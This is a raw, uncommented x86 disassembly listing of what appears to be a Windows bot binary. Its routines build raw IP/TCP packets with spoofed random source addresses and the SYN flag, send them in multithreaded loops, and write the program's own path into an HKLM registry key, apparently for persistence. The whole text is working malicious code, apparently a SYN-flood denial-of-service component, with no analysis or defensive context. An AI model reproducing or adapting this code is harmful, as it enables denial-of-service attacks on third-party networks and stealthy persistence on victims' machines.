131480df:	68 00 00 01 00       	push   $0x10000
131480e4:	57                   	push   %edi
131480e5:	ff 75 f8             	pushl  -0x8(%ebp)
131480e8:	ff 15 4c 37 15 13    	call   *0x1315374c
131480ee:	83 f8 ff             	cmp    $0xffffffff,%eax
131480f1:	74 13                	je     0x13148106
131480f3:	3b c3                	cmp    %ebx,%eax
131480f5:	7e 0f                	jle    0x13148106
131480f7:	53                   	push   %ebx
131480f8:	50                   	push   %eax
131480f9:	57                   	push   %edi
131480fa:	56                   	push   %esi
131480fb:	ff 15 68 37 15 13    	call   *0x13153768
13148101:	e9 fc fe ff ff       	jmp    0x13148002
13148106:	8b 45 e4             	mov    -0x1c(%ebp),%eax
13148109:	ff 45 e4             	incl   -0x1c(%ebp)
1314810c:	85 c0                	test   %eax,%eax
1314810e:	0f 84 4d fd ff ff    	je     0x13147e61
13148114:	eb 17                	jmp    0x1314812d
13148116:	c6 45 e9 08          	movb   $0x8,-0x17(%ebp)
1314811a:	eb 04                	jmp    0x13148120
1314811c:	c6 45 e9 01          	movb   $0x1,-0x17(%ebp)
13148120:	53                   	push   %ebx
13148121:	8d 45 e8             	lea    -0x18(%ebp),%eax
13148124:	57                   	push   %edi
13148125:	50                   	push   %eax
13148126:	56                   	push   %esi
13148127:	ff 15 68 37 15 13    	call   *0x13153768
1314812d:	3b f3                	cmp    %ebx,%esi
1314812f:	74 07                	je     0x13148138
13148131:	56                   	push   %esi
13148132:	ff 15 e4 36 15 13    	call   *0x131536e4
13148138:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
1314813b:	5f                   	pop    %edi
1314813c:	5e                   	pop    %esi
1314813d:	5b                   	pop    %ebx
1314813e:	74 09                	je     0x13148149
13148140:	ff 75 f8             	pushl  -0x8(%ebp)
13148143:	ff 15 e4 36 15 13    	call   *0x131536e4
13148149:	33 c0                	xor    %eax,%eax
1314814b:	c9                   	leave  
1314814c:	c2 04 00             	ret    $0x4
1314814f:	55                   	push   %ebp
13148150:	8b ec                	mov    %esp,%ebp
13148152:	81 ec 18 06 00 00    	sub    $0x618,%esp
13148158:	53                   	push   %ebx
13148159:	56                   	push   %esi
1314815a:	57                   	push   %edi
1314815b:	68 fc 3e 16 13       	push   $0x13163efc
13148160:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
13148166:	68 00 d1 14 13       	push   $0x1314d100
1314816b:	50                   	push   %eax
1314816c:	ff 15 98 39 15 13    	call   *0x13153998
13148172:	83 c4 0c             	add    $0xc,%esp
13148175:	6a 06                	push   $0x6
13148177:	6a 01                	push   $0x1
13148179:	6a 02                	push   $0x2
1314817b:	ff 15 64 35 15 13    	call   *0x13153564
13148181:	83 f8 ff             	cmp    $0xffffffff,%eax
13148184:	a3 fc 3f 16 13       	mov    %eax,0x13163ffc
13148189:	75 1e                	jne    0x131481a9
1314818b:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
13148191:	33 db                	xor    %ebx,%ebx
13148193:	68 f4 0a 15 13       	push   $0x13150af4
13148198:	50                   	push   %eax
13148199:	89 1d 00 40 16 13    	mov    %ebx,0x13164000
1314819f:	ff 15 98 39 15 13    	call   *0x13153998
131481a5:	59                   	pop    %ecx
131481a6:	59                   	pop    %ecx
131481a7:	eb 60                	jmp    0x13148209
131481a9:	66 a1 f8 3e 16 13    	mov    0x13163ef8,%ax
131481af:	66 c7 45 f0 02 00    	movw   $0x2,-0x10(%ebp)
131481b5:	50                   	push   %eax
131481b6:	ff 15 8c 37 15 13    	call   *0x1315378c
131481bc:	66 89 45 f2          	mov    %ax,-0xe(%ebp)
131481c0:	8d 45 f0             	lea    -0x10(%ebp),%eax
131481c3:	6a 10                	push   $0x10
131481c5:	50                   	push   %eax
131481c6:	ff 35 fc 3f 16 13    	pushl  0x13163ffc
131481cc:	33 db                	xor    %ebx,%ebx
131481ce:	89 5d f4             	mov    %ebx,-0xc(%ebp)
131481d1:	ff 15 5c 37 15 13    	call   *0x1315375c
131481d7:	83 f8 ff             	cmp    $0xffffffff,%eax
131481da:	75 5d                	jne    0x13148239
131481dc:	ff 35 fc 3f 16 13    	pushl  0x13163ffc
131481e2:	89 1d 00 40 16 13    	mov    %ebx,0x13164000
131481e8:	ff 15 e4 36 15 13    	call   *0x131536e4
131481ee:	ff 35 f8 3e 16 13    	pushl  0x13163ef8
131481f4:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
131481fa:	68 c4 0a 15 13       	push   $0x13150ac4
131481ff:	50                   	push   %eax
13148200:	ff 15 98 39 15 13    	call   *0x13153998
13148206:	83 c4 0c             	add    $0xc,%esp
13148209:	39 1d 08 40 16 13    	cmp    %ebx,0x13164008
1314820f:	75 3e                	jne    0x1314824f
13148211:	ff 35 0c 40 16 13    	pushl  0x1316400c
13148217:	b9 81 01 00 00       	mov    $0x181,%ecx
1314821c:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
13148222:	81 ec 04 06 00 00    	sub    $0x604,%esp
13148228:	8b fc                	mov    %esp,%edi
1314822a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314822c:	e8 bb 08 00 00       	call   0x13148aec
13148231:	81 c4 08 06 00 00    	add    $0x608,%esp
13148237:	eb 16                	jmp    0x1314824f
13148239:	68 ff 00 00 00       	push   $0xff
1314823e:	ff 35 fc 3f 16 13    	pushl  0x13163ffc
13148244:	ff 15 00 34 15 13    	call   *0x13153400
1314824a:	83 f8 ff             	cmp    $0xffffffff,%eax
1314824d:	75 04                	jne    0x13148253
1314824f:	33 c0                	xor    %eax,%eax
13148251:	eb 7f                	jmp    0x131482d2
13148253:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
13148259:	68 b4 0a 15 13       	push   $0x13150ab4
1314825e:	50                   	push   %eax
1314825f:	ff 15 98 39 15 13    	call   *0x13153998
13148265:	39 1d 08 40 16 13    	cmp    %ebx,0x13164008
1314826b:	59                   	pop    %ecx
1314826c:	59                   	pop    %ecx
1314826d:	75 26                	jne    0x13148295
1314826f:	ff 35 0c 40 16 13    	pushl  0x1316400c
13148275:	b9 81 01 00 00       	mov    $0x181,%ecx
1314827a:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
13148280:	81 ec 04 06 00 00    	sub    $0x604,%esp
13148286:	8b fc                	mov    %esp,%edi
13148288:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314828a:	e8 5d 08 00 00       	call   0x13148aec
1314828f:	81 c4 08 06 00 00    	add    $0x608,%esp
13148295:	ff 35 f8 3e 16 13    	pushl  0x13163ef8
1314829b:	6a 01                	push   $0x1
1314829d:	e8 f1 00 00 00       	call   0x13148393
131482a2:	59                   	pop    %ecx
131482a3:	59                   	pop    %ecx
131482a4:	39 1d 00 40 16 13    	cmp    %ebx,0x13164000
131482aa:	74 23                	je     0x131482cf
131482ac:	8d 45 ec             	lea    -0x14(%ebp),%eax
131482af:	50                   	push   %eax
131482b0:	53                   	push   %ebx
131482b1:	53                   	push   %ebx
131482b2:	53                   	push   %ebx
131482b3:	ff 35 fc 3f 16 13    	pushl  0x13163ffc
131482b9:	ff 15 3c 37 15 13    	call   *0x1315373c
131482bf:	50                   	push   %eax
131482c0:	68 45 7e 14 13       	push   $0x13147e45
131482c5:	53                   	push   %ebx
131482c6:	53                   	push   %ebx
131482c7:	ff 15 30 37 15 13    	call   *0x13153730
131482cd:	eb d5                	jmp    0x131482a4
131482cf:	6a 01                	push   $0x1
131482d1:	58                   	pop    %eax
131482d2:	5f                   	pop    %edi
131482d3:	5e                   	pop    %esi
131482d4:	5b                   	pop    %ebx
131482d5:	c9                   	leave  
131482d6:	c2 04 00             	ret    $0x4
131482d9:	55                   	push   %ebp
131482da:	8b ec                	mov    %esp,%ebp
131482dc:	ff 75 0c             	pushl  0xc(%ebp)
131482df:	68 00 d1 14 13       	push   $0x1314d100
131482e4:	68 fc 3e 16 13       	push   $0x13163efc
131482e9:	ff 15 98 39 15 13    	call   *0x13153998
131482ef:	33 c0                	xor    %eax,%eax
131482f1:	83 c4 0c             	add    $0xc,%esp
131482f4:	39 05 00 40 16 13    	cmp    %eax,0x13164000
131482fa:	74 04                	je     0x13148300
131482fc:	6a 02                	push   $0x2
131482fe:	eb 42                	jmp    0x13148342
13148300:	8b 0d 44 45 17 13    	mov    0x13174544,%ecx
13148306:	c7 05 00 40 16 13 01 	movl   $0x1,0x13164000
1314830d:	00 00 00 
13148310:	89 0d 08 40 16 13    	mov    %ecx,0x13164008
13148316:	8b 4d 08             	mov    0x8(%ebp),%ecx
13148319:	89 0d f8 3e 16 13    	mov    %ecx,0x13163ef8
1314831f:	8b 4d 10             	mov    0x10(%ebp),%ecx
13148322:	89 0d 0c 40 16 13    	mov    %ecx,0x1316400c
13148328:	8d 4d 0c             	lea    0xc(%ebp),%ecx
1314832b:	51                   	push   %ecx
1314832c:	50                   	push   %eax
1314832d:	50                   	push   %eax
1314832e:	68 4f 81 14 13       	push   $0x1314814f
13148333:	50                   	push   %eax
13148334:	50                   	push   %eax
13148335:	ff 15 30 37 15 13    	call   *0x13153730
1314833b:	a3 04 40 16 13       	mov    %eax,0x13164004
13148340:	6a 01                	push   $0x1
13148342:	58                   	pop    %eax
13148343:	5d                   	pop    %ebp
13148344:	c3                   	ret    
13148345:	56                   	push   %esi
13148346:	33 f6                	xor    %esi,%esi
13148348:	39 35 00 40 16 13    	cmp    %esi,0x13164000
1314834e:	75 04                	jne    0x13148354
13148350:	6a 02                	push   $0x2
13148352:	eb 30                	jmp    0x13148384
13148354:	ff 35 fc 3f 16 13    	pushl  0x13163ffc
1314835a:	89 35 00 40 16 13    	mov    %esi,0x13164000
13148360:	ff 15 e4 36 15 13    	call   *0x131536e4
13148366:	56                   	push   %esi
13148367:	ff 35 04 40 16 13    	pushl  0x13164004
1314836d:	ff 15 d8 36 15 13    	call   *0x131536d8
13148373:	39 74 24 08          	cmp    %esi,0x8(%esp)
13148377:	74 09                	je     0x13148382
13148379:	56                   	push   %esi
1314837a:	56                   	push   %esi
1314837b:	e8 13 00 00 00       	call   0x13148393
13148380:	59                   	pop    %ecx
13148381:	59                   	pop    %ecx
13148382:	6a 01                	push   $0x1
13148384:	58                   	pop    %eax
13148385:	5e                   	pop    %esi
13148386:	c3                   	ret    
13148387:	a1 00 40 16 13       	mov    0x13164000,%eax
1314838c:	c3                   	ret    
1314838d:	a1 f8 3e 16 13       	mov    0x13163ef8,%eax
13148392:	c3                   	ret    
13148393:	8d 44 24 04          	lea    0x4(%esp),%eax
13148397:	6a 04                	push   $0x4
13148399:	50                   	push   %eax
1314839a:	68 24 0b 15 13       	push   $0x13150b24
1314839f:	e8 67 eb ff ff       	call   0x13146f0b
131483a4:	83 c4 0c             	add    $0xc,%esp
131483a7:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
131483ac:	74 14                	je     0x131483c2
131483ae:	8d 44 24 08          	lea    0x8(%esp),%eax
131483b2:	6a 04                	push   $0x4
131483b4:	50                   	push   %eax
131483b5:	68 18 0b 15 13       	push   $0x13150b18
131483ba:	e8 4c eb ff ff       	call   0x13146f0b
131483bf:	83 c4 0c             	add    $0xc,%esp
131483c2:	6a 01                	push   $0x1
131483c4:	58                   	pop    %eax
131483c5:	c3                   	ret    
131483c6:	55                   	push   %ebp
131483c7:	8b ec                	mov    %esp,%ebp
131483c9:	81 ec 90 02 00 00    	sub    $0x290,%esp
131483cf:	8d 45 8c             	lea    -0x74(%ebp),%eax
131483d2:	68 48 0b 15 13       	push   $0x13150b48
131483d7:	50                   	push   %eax
131483d8:	e8 fc d9 ff ff       	call   0x13145dd9
131483dd:	59                   	pop    %ecx
131483de:	8d 45 fc             	lea    -0x4(%ebp),%eax
131483e1:	59                   	pop    %ecx
131483e2:	50                   	push   %eax
131483e3:	68 3f 00 0f 00       	push   $0xf003f
131483e8:	8d 45 8c             	lea    -0x74(%ebp),%eax
131483eb:	6a 00                	push   $0x0
131483ed:	50                   	push   %eax
131483ee:	68 02 00 00 80       	push   $0x80000002
131483f3:	ff 15 ac 33 15 13    	call   *0x131533ac
131483f9:	85 c0                	test   %eax,%eax
131483fb:	74 04                	je     0x13148401
131483fd:	33 c0                	xor    %eax,%eax
131483ff:	c9                   	leave  
13148400:	c3                   	ret    
13148401:	8d 85 8c fe ff ff    	lea    -0x174(%ebp),%eax
13148407:	68 00 01 00 00       	push   $0x100
1314840c:	50                   	push   %eax
1314840d:	6a 00                	push   $0x0
1314840f:	ff 15 08 10 14 13    	call   *0x13141008
13148415:	50                   	push   %eax
13148416:	ff 15 40 35 15 13    	call   *0x13153540
1314841c:	8d 85 8c fe ff ff    	lea    -0x174(%ebp),%eax
13148422:	68 34 0b 15 13       	push   $0x13150b34
13148427:	50                   	push   %eax
13148428:	8d 85 70 fd ff ff    	lea    -0x290(%ebp),%eax
1314842e:	68 14 ed 14 13       	push   $0x1314ed14
13148433:	50                   	push   %eax
13148434:	ff 15 98 39 15 13    	call   *0x13153998
1314843a:	8d 85 70 fd ff ff    	lea    -0x290(%ebp),%eax
13148440:	50                   	push   %eax
13148441:	e8 b7 a2 ff ff       	call   0x131426fd
13148446:	83 c4 14             	add    $0x14,%esp
13148449:	50                   	push   %eax
1314844a:	8d 85 70 fd ff ff    	lea    -0x290(%ebp),%eax
13148450:	50                   	push   %eax
13148451:	6a 01                	push   $0x1
13148453:	8d 85 8c fe ff ff    	lea    -0x174(%ebp),%eax
13148459:	6a 00                	push   $0x0
1314845b:	50                   	push   %eax
1314845c:	ff 75 fc             	pushl  -0x4(%ebp)
1314845f:	ff 15 44 35 15 13    	call   *0x13153544
13148465:	ff 75 fc             	pushl  -0x4(%ebp)
13148468:	ff 15 cc 36 15 13    	call   *0x131536cc
1314846e:	6a 01                	push   $0x1
13148470:	58                   	pop    %eax
13148471:	c9                   	leave  
13148472:	c3                   	ret    
13148473:	55                   	push   %ebp
13148474:	8b ec                	mov    %esp,%ebp
13148476:	83 ec 5c             	sub    $0x5c,%esp
13148479:	8d 45 a4             	lea    -0x5c(%ebp),%eax
1314847c:	53                   	push   %ebx
1314847d:	89 45 fc             	mov    %eax,-0x4(%ebp)
13148480:	66 a1 90 40 17 13    	mov    0x13174090,%ax
13148486:	56                   	push   %esi
13148487:	50                   	push   %eax
13148488:	66 c7 45 ec 02 00    	movw   $0x2,-0x14(%ebp)
1314848e:	ff 15 8c 37 15 13    	call   *0x1315378c
13148494:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
13148498:	8b 45 0c             	mov    0xc(%ebp),%eax
1314849b:	89 45 f0             	mov    %eax,-0x10(%ebp)
1314849e:	33 db                	xor    %ebx,%ebx
131484a0:	6a 28                	push   $0x28
131484a2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
131484a5:	53                   	push   %ebx
131484a6:	50                   	push   %eax
131484a7:	e8 76 a1 ff ff       	call   0x13142622
131484ac:	8b 35 00 24 15 13    	mov    0x13152400,%esi
131484b2:	83 c4 0c             	add    $0xc,%esp
131484b5:	3b f3                	cmp    %ebx,%esi
131484b7:	75 07                	jne    0x131484c0
131484b9:	e8 27 a2 ff ff       	call   0x131426e5
131484be:	8b f0                	mov    %eax,%esi
131484c0:	8b 45 fc             	mov    -0x4(%ebp),%eax
131484c3:	8a 08                	mov    (%eax),%cl
131484c5:	80 e1 f5             	and    $0xf5,%cl
131484c8:	80 c9 05             	or     $0x5,%cl
131484cb:	88 08                	mov    %cl,(%eax)
131484cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
131484d0:	8a 08                	mov    (%eax),%cl
131484d2:	80 e1 0f             	and    $0xf,%cl
131484d5:	80 c9 40             	or     $0x40,%cl
131484d8:	88 08                	mov    %cl,(%eax)
131484da:	8b 45 fc             	mov    -0x4(%ebp),%eax
131484dd:	88 58 01             	mov    %bl,0x1(%eax)
131484e0:	8b 45 fc             	mov    -0x4(%ebp),%eax
131484e3:	66 c7 40 02 28 00    	movw   $0x28,0x2(%eax)
131484e9:	e8 f7 a1 ff ff       	call   0x131426e5
131484ee:	8b 4d fc             	mov    -0x4(%ebp),%ecx
131484f1:	66 89 41 04          	mov    %ax,0x4(%ecx)
131484f5:	8b 45 fc             	mov    -0x4(%ebp),%eax
131484f8:	66 89 58 06          	mov    %bx,0x6(%eax)
131484fc:	8b 45 fc             	mov    -0x4(%ebp),%eax
131484ff:	80 48 08 ff          	orb    $0xff,0x8(%eax)
13148503:	8b 45 fc             	mov    -0x4(%ebp),%eax
13148506:	c6 40 09 06          	movb   $0x6,0x9(%eax)
1314850a:	8b 45 fc             	mov    -0x4(%ebp),%eax
1314850d:	66 89 58 0a          	mov    %bx,0xa(%eax)
13148511:	8b 45 fc             	mov    -0x4(%ebp),%eax
13148514:	89 70 0c             	mov    %esi,0xc(%eax)
13148517:	8b 45 fc             	mov    -0x4(%ebp),%eax
1314851a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1314851d:	89 48 10             	mov    %ecx,0x10(%eax)
13148520:	a1 04 24 15 13       	mov    0x13152404,%eax
13148525:	3b c3                	cmp    %ebx,%eax
13148527:	75 0d                	jne    0x13148536
13148529:	68 60 ea 00 00       	push   $0xea60
1314852e:	53                   	push   %ebx
1314852f:	e8 9b d4 ff ff       	call   0x131459cf
13148534:	59                   	pop    %ecx
13148535:	59                   	pop    %ecx
13148536:	50                   	push   %eax
13148537:	ff 15 8c 37 15 13    	call   *0x1315378c
1314853d:	0f b7 c0             	movzwl %ax,%eax
13148540:	66 89 45 b8          	mov    %ax,-0x48(%ebp)
13148544:	66 8b 45 ee          	mov    -0x12(%ebp),%ax
13148548:	66 89 45 ba          	mov    %ax,-0x46(%ebp)
1314854c:	e8 94 a1 ff ff       	call   0x131426e5
13148551:	89 45 bc             	mov    %eax,-0x44(%ebp)
13148554:	8a 45 c4             	mov    -0x3c(%ebp),%al
13148557:	24 f0                	and    $0xf0,%al
13148559:	68 00 02 00 00       	push   $0x200
1314855e:	24 0f                	and    $0xf,%al
13148560:	89 5d c0             	mov    %ebx,-0x40(%ebp)
13148563:	0c 50                	or     $0x50,%al
13148565:	c6 45 c5 02          	movb   $0x2,-0x3b(%ebp)
13148569:	88 45 c4             	mov    %al,-0x3c(%ebp)
1314856c:	ff 15 8c 37 15 13    	call   *0x1315378c
13148572:	66 89 45 c6          	mov    %ax,-0x3a(%ebp)
13148576:	8b 45 fc             	mov    -0x4(%ebp),%eax
13148579:	66 89 5d c8          	mov    %bx,-0x38(%ebp)
1314857d:	66 89 5d ca          	mov    %bx,-0x36(%ebp)
13148581:	8b 40 0c             	mov    0xc(%eax),%eax
13148584:	6a 14                	push   $0x14
13148586:	89 45 cc             	mov    %eax,-0x34(%ebp)
13148589:	8b 45 f0             	mov    -0x10(%ebp),%eax
1314858c:	89 45 d0             	mov    %eax,-0x30(%ebp)
1314858f:	88 5d d4             	mov    %bl,-0x2c(%ebp)
13148592:	c6 45 d5 06          	movb   $0x6,-0x2b(%ebp)
13148596:	ff 15 8c 37 15 13    	call   *0x1315378c
1314859c:	66 89 45 d6          	mov    %ax,-0x2a(%ebp)
131485a0:	8d 45 b8             	lea    -0x48(%ebp),%eax
131485a3:	6a 14                	push   $0x14
131485a5:	50                   	push   %eax
131485a6:	8d 45 d8             	lea    -0x28(%ebp),%eax
131485a9:	50                   	push   %eax
131485aa:	e8 a1 a1 ff ff       	call   0x13142750
131485af:	8d 45 fc             	lea    -0x4(%ebp),%eax
131485b2:	6a 14                	push   $0x14
131485b4:	50                   	push   %eax
131485b5:	e8 3a d4 ff ff       	call   0x131459f4
131485ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
131485bd:	6a 20                	push   $0x20
131485bf:	66 89 41 0a          	mov    %ax,0xa(%ecx)
131485c3:	8d 45 cc             	lea    -0x34(%ebp),%eax
131485c6:	50                   	push   %eax
131485c7:	e8 28 d4 ff ff       	call   0x131459f4
131485cc:	83 c4 1c             	add    $0x1c,%esp
131485cf:	66 89 45 c8          	mov    %ax,-0x38(%ebp)
131485d3:	8d 45 ec             	lea    -0x14(%ebp),%eax
131485d6:	6a 10                	push   $0x10
131485d8:	50                   	push   %eax
131485d9:	53                   	push   %ebx
131485da:	8d 45 a4             	lea    -0x5c(%ebp),%eax
131485dd:	6a 28                	push   $0x28
131485df:	50                   	push   %eax
131485e0:	ff 75 08             	pushl  0x8(%ebp)
131485e3:	ff 15 68 36 15 13    	call   *0x13153668
131485e9:	5e                   	pop    %esi
131485ea:	5b                   	pop    %ebx
131485eb:	c9                   	leave  
131485ec:	c3                   	ret    
131485ed:	55                   	push   %ebp
131485ee:	8b ec                	mov    %esp,%ebp
131485f0:	81 ec 0c 06 00 00    	sub    $0x60c,%esp
131485f6:	53                   	push   %ebx
131485f7:	56                   	push   %esi
131485f8:	57                   	push   %edi
131485f9:	8d 85 f4 fa ff ff    	lea    -0x50c(%ebp),%eax
131485ff:	68 98 40 17 13       	push   $0x13174098
13148604:	50                   	push   %eax
13148605:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
1314860c:	ff 15 98 39 15 13    	call   *0x13153998
13148612:	59                   	pop    %ecx
13148613:	59                   	pop    %ecx
13148614:	68 ff 00 00 00       	push   $0xff
13148619:	6a 03                	push   $0x3
1314861b:	6a 02                	push   $0x2
1314861d:	ff 15 64 35 15 13    	call   *0x13153564
13148623:	83 cf ff             	or     $0xffffffff,%edi
13148626:	89 45 fc             	mov    %eax,-0x4(%ebp)
13148629:	3b c7                	cmp    %edi,%eax
1314862b:	75 18                	jne    0x13148645
1314862d:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
13148633:	68 10 0c 15 13       	push   $0x13150c10
13148638:	50                   	push   %eax
13148639:	ff 15 98 39 15 13    	call   *0x13153998
1314863f:	59                   	pop    %ecx
13148640:	33 db                	xor    %ebx,%ebx
13148642:	59                   	pop    %ecx
13148643:	eb 5a                	jmp    0x1314869f
13148645:	8d 4d f8             	lea    -0x8(%ebp),%ecx
13148648:	6a 04                	push   $0x4
1314864a:	51                   	push   %ecx
1314864b:	33 db                	xor    %ebx,%ebx
1314864d:	6a 02                	push   $0x2
1314864f:	53                   	push   %ebx
13148650:	50                   	push   %eax
13148651:	ff 15 84 36 15 13    	call   *0x13153684
13148657:	3b c7                	cmp    %edi,%eax
13148659:	75 07                	jne    0x13148662
1314865b:	68 e8 0b 15 13       	push   $0x13150be8
13148660:	eb 2e                	jmp    0x13148690
13148662:	e8 5d a0 ff ff       	call   0x131426c4
13148667:	be 10 40 17 13       	mov    $0x13174010,%esi
1314866c:	56                   	push   %esi
1314866d:	ff 15 ac 39 15 13    	call   *0x131539ac
13148673:	3b c7                	cmp    %edi,%eax
13148675:	56                   	push   %esi
13148676:	75 07                	jne    0x1314867f
13148678:	e8 a9 cd ff ff       	call   0x13145426
1314867d:	59                   	pop    %ecx
1314867e:	50                   	push   %eax
1314867f:	ff 15 ac 39 15 13    	call   *0x131539ac
13148685:	8b f0                	mov    %eax,%esi
13148687:	3b f7                	cmp    %edi,%esi
13148689:	75 52                	jne    0x131486dd
1314868b:	68 c4 0b 15 13       	push   $0x13150bc4
13148690:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
13148696:	50                   	push   %eax
13148697:	ff 15 98 39 15 13    	call   *0x13153998
1314869d:	59                   	pop    %ecx
1314869e:	59                   	pop    %ecx
1314869f:	39 1d 98 41 17 13    	cmp    %ebx,0x13174198
131486a5:	75 2e                	jne    0x131486d5
131486a7:	39 1d 94 40 17 13    	cmp    %ebx,0x13174094
131486ad:	74 26                	je     0x131486d5
131486af:	ff 35 64 42 17 13    	pushl  0x13174264
131486b5:	b9 81 01 00 00       	mov    $0x181,%ecx
131486ba:	8d b5 f4 f9 ff ff    	lea    -0x60c(%ebp),%esi
131486c0:	81 ec 04 06 00 00    	sub    $0x604,%esp
131486c6:	8b fc                	mov    %esp,%edi
131486c8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131486ca:	e8 1d 04 00 00       	call   0x13148aec
131486cf:	81 c4 08 06 00 00    	add    $0x608,%esp
131486d5:	89 1d 94 40 17 13    	mov    %ebx,0x13174094
131486db:	eb 2a                	jmp    0x13148707
131486dd:	39 1d 94 40 17 13    	cmp    %ebx,0x13174094
131486e3:	74 19                	je     0x131486fe
131486e5:	56                   	push   %esi
131486e6:	ff 75 fc             	pushl  -0x4(%ebp)
131486e9:	e8 85 fd ff ff       	call   0x13148473
131486ee:	59                   	pop    %ecx
131486ef:	59                   	pop    %ecx
131486f0:	ff 35 bc 0b 15 13    	pushl  0x13150bbc
131486f6:	ff 15 fc 36 15 13    	call   *0x131536fc
131486fc:	eb df                	jmp    0x131486dd
131486fe:	ff 75 fc             	pushl  -0x4(%ebp)
13148701:	ff 15 e4 36 15 13    	call   *0x131536e4
13148707:	5f                   	pop    %edi
13148708:	5e                   	pop    %esi
13148709:	33 c0                	xor    %eax,%eax
1314870b:	5b                   	pop    %ebx
1314870c:	c9                   	leave  
1314870d:	c2 04 00             	ret    $0x4
13148710:	55                   	push   %ebp
13148711:	8b ec                	mov    %esp,%ebp
13148713:	56                   	push   %esi
13148714:	33 f6                	xor    %esi,%esi
13148716:	39 35 94 40 17 13    	cmp    %esi,0x13174094
1314871c:	74 05                	je     0x13148723
1314871e:	6a 02                	push   $0x2
13148720:	58                   	pop    %eax
13148721:	eb 7f                	jmp    0x131487a2
13148723:	a1 44 45 17 13       	mov    0x13174544,%eax
13148728:	57                   	push   %edi
13148729:	ff 75 08             	pushl  0x8(%ebp)
1314872c:	a3 98 41 17 13       	mov    %eax,0x13174198
13148731:	8b 45 0c             	mov    0xc(%ebp),%eax
13148734:	c7 05 94 40 17 13 01 	movl   $0x1,0x13174094
1314873b:	00 00 00 
1314873e:	a3 90 40 17 13       	mov    %eax,0x13174090
13148743:	8b 45 14             	mov    0x14(%ebp),%eax
13148746:	68 00 d1 14 13       	push   $0x1314d100
1314874b:	68 10 40 17 13       	push   $0x13174010
13148750:	a3 64 42 17 13       	mov    %eax,0x13174264
13148755:	ff 15 98 39 15 13    	call   *0x13153998
1314875b:	ff 75 10             	pushl  0x10(%ebp)
1314875e:	68 98 40 17 13       	push   $0x13174098
13148763:	ff 15 98 39 15 13    	call   *0x13153998
13148769:	83 c4 14             	add    $0x14,%esp
1314876c:	33 ff                	xor    %edi,%edi
1314876e:	39 35 c0 0b 15 13    	cmp    %esi,0x13150bc0
13148774:	7e 28                	jle    0x1314879e
13148776:	53                   	push   %ebx
13148777:	bb 9c 41 17 13       	mov    $0x1317419c,%ebx
1314877c:	8d 45 0c             	lea    0xc(%ebp),%eax
1314877f:	50                   	push   %eax
13148780:	56                   	push   %esi
13148781:	56                   	push   %esi
13148782:	68 ed 85 14 13       	push   $0x131485ed
13148787:	56                   	push   %esi
13148788:	56                   	push   %esi
13148789:	ff 15 30 37 15 13    	call   *0x13153730
1314878f:	89 03                	mov    %eax,(%ebx)
13148791:	47                   	inc    %edi
13148792:	83 c3 04             	add    $0x4,%ebx
13148795:	3b 3d c0 0b 15 13    	cmp    0x13150bc0,%edi
1314879b:	7c df                	jl     0x1314877c
1314879d:	5b                   	pop    %ebx
1314879e:	6a 01                	push   $0x1
131487a0:	58                   	pop    %eax
131487a1:	5f                   	pop    %edi
131487a2:	5e                   	pop    %esi
131487a3:	5d                   	pop    %ebp
131487a4:	c3                   	ret    
131487a5:	83 3d 94 40 17 13 00 	cmpl   $0x0,0x13174094
131487ac:	75 04                	jne    0x131487b2
131487ae:	6a 02                	push   $0x2
131487b0:	58                   	pop    %eax
131487b1:	c3                   	ret    
131487b2:	83 25 94 40 17 13 00 	andl   $0x0,0x13174094
131487b9:	6a 01                	push   $0x1
131487bb:	58                   	pop    %eax
131487bc:	c3                   	ret    
131487bd:	b8 10 40 17 13       	mov    $0x13174010,%eax
131487c2:	c3                   	ret    
131487c3:	a1 90 40 17 13       	mov    0x13174090,%eax
131487c8:	c3                   	ret    
131487c9:	a1 94 40 17 13       	mov    0x13174094,%eax
131487ce:	c3                   	ret    
131487cf:	56                   	push   %esi
131487d0:	57                   	push   %edi
131487d1:	8b 7c 24 14          	mov    0x14(%esp),%edi
131487d5:	66 85 ff             	test   %di,%di
131487d8:	75 10                	jne    0x131487ea
131487da:	68 d0 07 00 00       	push   $0x7d0
131487df:	6a 40                	push   $0x40
131487e1:	e8 e9 d1 ff ff       	call   0x131459cf
131487e6:	59                   	pop    %ecx
131487e7:	8b f8                	mov    %eax,%edi
131487e9:	59                   	pop    %ecx
131487ea:	8b 74 24 0c          	mov    0xc(%esp),%esi
131487ee:	6a 21                	push   $0x21
131487f0:	68 44 0c 15 13       	push   $0x13150c44
131487f5:	56                   	push   %esi
131487f6:	e8 55 9f ff ff       	call   0x13142750
131487fb:	a1 00 24 15 13       	mov    0x13152400,%eax
13148800:	83 c4 0c             	add    $0xc,%esp
13148803:	85 c0                	test   %eax,%eax
13148805:	75 05                	jne    0x1314880c
13148807:	e8 d9 9e ff ff       	call   0x131426e5
1314880c:	89 46 0c             	mov    %eax,0xc(%esi)
1314880f:	8b 44 24 18          	mov    0x18(%esp),%eax
13148813:	57                   	push   %edi
13148814:	89 46 10             	mov    %eax,0x10(%esi)
13148817:	ff 15 8c 37 15 13    	call   *0x1315378c
1314881d:	66 89 46 02          	mov    %ax,0x2(%esi)
13148821:	a1 08 24 15 13       	mov    0x13152408,%eax
13148826:	85 c0                	test   %eax,%eax
13148828:	75 0d                	jne    0x13148837
1314882a:	68 60 ea 00 00       	push   $0xea60
1314882f:	50                   	push   %eax
13148830:	e8 9a d1 ff ff       	call   0x131459cf
13148835:	59                   	pop    %ecx
13148836:	59                   	pop    %ecx
13148837:	50                   	push   %eax
